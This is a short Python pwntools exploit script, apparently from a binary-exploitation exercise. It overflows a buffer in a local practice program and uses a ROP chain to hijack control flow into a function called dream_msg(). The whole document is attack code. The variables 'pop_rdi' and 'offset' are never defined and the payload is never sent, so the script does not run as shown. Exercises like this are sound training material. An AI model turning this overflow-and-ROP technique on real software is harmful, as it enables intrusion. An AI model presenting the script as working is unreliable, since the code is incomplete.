#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF('./bin/ex2')

dream_msg_addr = exe.symbols['dream_msg']  # Address of dream_msg()
msg_addr = next(exe.search(b"Dreams of bytes"))  # Address of string in binary

rop = ROP(exe)
rop.raw(pop_rdi)           # Set up the first argument
rop.raw(msg_addr)          # Address of string
rop.raw(dream_msg_addr)    # Call dream_msg()

payload = flat(
    b'A' * offset,         # Overflow buffer to control RIP
    rop.chain()
)
